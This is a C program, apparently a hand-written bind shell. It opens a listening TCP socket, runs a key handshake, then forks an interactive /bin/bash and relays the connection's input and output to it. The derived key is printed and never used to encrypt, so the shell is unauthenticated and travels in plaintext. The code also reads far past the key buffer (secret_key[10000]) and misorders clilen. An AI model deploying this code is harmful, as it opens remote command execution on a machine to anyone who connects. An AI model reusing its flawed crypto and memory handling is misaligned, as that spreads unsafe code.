#include<stdio.h>
#include<stdlib.h>
#include <unistd.h>
#include<string.h>
#include <sys/types.h>

#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "crypto.c"
#define NUM_PIPES          2

#define PARENT_WRITE_PIPE  0
#define PARENT_READ_PIPE   1

int pipes[NUM_PIPES][2];

/* always in a pipe[], pipe[0] is for read and
   pipe[1] is for write */
#define READ_FD  0
#define WRITE_FD 1

#define CHILD_WRITE_FD  ( pipes[PARENT_READ_PIPE][WRITE_FD]  )
#define PARENT_READ_FD  ( pipes[PARENT_READ_PIPE][READ_FD]   )
#define PARENT_WRITE_FD ( pipes[PARENT_WRITE_PIPE][WRITE_FD] )
#define CHILD_READ_FD   ( pipes[PARENT_WRITE_PIPE][READ_FD]  )

#define ERROR_PIPE ( errfd[1] )


void error(char *msg)
{
    perror(msg);
    exit(1);
}
void hex (unsigned char *p, size_t n){
  for (int i = 0;i<n;i++) {
    printf("%02x", *p++);
  }
}
int main(int argc, char *argv[]) {
  // Network stuff
  int sockfd, newsockfd, portno, n;

  socklen_t clilen;
  char sock_buffer[1024];

  struct sockaddr_in serv_addr, cli_addr;
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  bzero((char *) &serv_addr, sizeof(serv_addr));
  portno =  atoi(argv[1]);

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(portno);
  serv_addr.sin_addr.s_addr = INADDR_ANY;

  if (bind(sockfd, (struct sockaddr *) &serv_addr,
           sizeof(serv_addr)) < 0)
               error("ERROR on binding");

  listen(sockfd,5);

  printf("Waiting for connections on port: %d \n", portno);
  newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
  clilen = sizeof(cli_addr);

  bzero(sock_buffer,1024);

  // Setting up pipes for bash <-> socket
  // communication.
  pipe(pipes[PARENT_READ_PIPE]);
  pipe(pipes[PARENT_WRITE_PIPE]);

  int errfd[2];
  pipe(errfd);

  // Begin doing crypto handshake with client
  unsigned char iv[16];
  EVP_PKEY * full_key = generate_key();
  unsigned char server_public_key [100];
  unsigned char client_public_key[100];
  unsigned char *public_key_ptr = &server_public_key[0];
  size_t server_pub_len = i2d_PUBKEY (full_key, &public_key_ptr);

  n = recv(newsockfd,sock_buffer,75, 0);
  memcpy(iv, sock_buffer, 16);
  memcpy(client_public_key, &sock_buffer[16], 59);

  char writebuffer[1000];
  bzero(writebuffer, 1000);
  memcpy(writebuffer, server_public_key, 59);

  n =  write(newsockfd, writebuffer, 59);
  if (n < 0) {
      printf("failed to write :(");
  }

  size_t keylen;
  unsigned char * secret_key = derive (full_key, client_public_key, 59, &keylen);

  printf("PRINTING SECRET KEYx\n");
  printf("Another string\n");
  hex(secret_key, keylen);
  printf("\n");

  printf("Big char: %02x\n", secret_key[10000]);
  printf("\n");

  pid_t procId = fork();

  if (procId == 0 ) {
    char *argv[]={ "/bin/bash", "-i", 0};

    dup2(CHILD_READ_FD, STDIN_FILENO);
    dup2(CHILD_WRITE_FD, STDOUT_FILENO);
    dup2(ERROR_PIPE, STDERR_FILENO);

    execv(argv[0], argv);
  } else if (procId > 0) {
    char bash_buffer[10000];
    int file_listing;
    /* close fds not required by parent */
    close(CHILD_READ_FD);
    close(CHILD_WRITE_FD);

    fd_set rfds;
    int retval, highestFileDescriptor;

    highestFileDescriptor = PARENT_READ_FD > newsockfd ? PARENT_READ_FD : newsockfd;

    while (1) {
      FD_ZERO(&rfds);
      FD_SET(PARENT_READ_FD, &rfds);
      FD_SET(newsockfd, &rfds);

      printf("About to select\n");
      retval = select(highestFileDescriptor + 1, &rfds, NULL, NULL, NULL);
      printf("Select returned\n");
      if (retval == -1) {
        perror("error with select");
      } else if (retval) {
        if(FD_ISSET(PARENT_READ_FD, &rfds)) {
            // data is available from bash
            bzero(bash_buffer, 10000);
            file_listing = read(PARENT_READ_FD, bash_buffer, sizeof(bash_buffer)-1);
            printf("Read returned with %s\n", bash_buffer);
            if (file_listing >= 0) {
              send(newsockfd, bash_buffer,strlen(bash_buffer), 0);
              printf("sending: %s", bash_buffer);
            }
        } else {
          // data is available on socket
          n = recv(newsockfd,sock_buffer,255, 0);
          printf("finished reading\n");
          if (n > 0) {
            printf("received %s\n", sock_buffer);
          } else {
            printf("failed to read");
          }
          printf("starting to write: %s\n", sock_buffer);
          write(PARENT_WRITE_FD, sock_buffer, strlen(sock_buffer));
          if (n < 0) {
            printf("failed to write :(");
          }
          memset(sock_buffer, 0, strlen(sock_buffer));

        }
      }
    }
  } else {
    printf("failed to fork a process :(\n");
  }
}
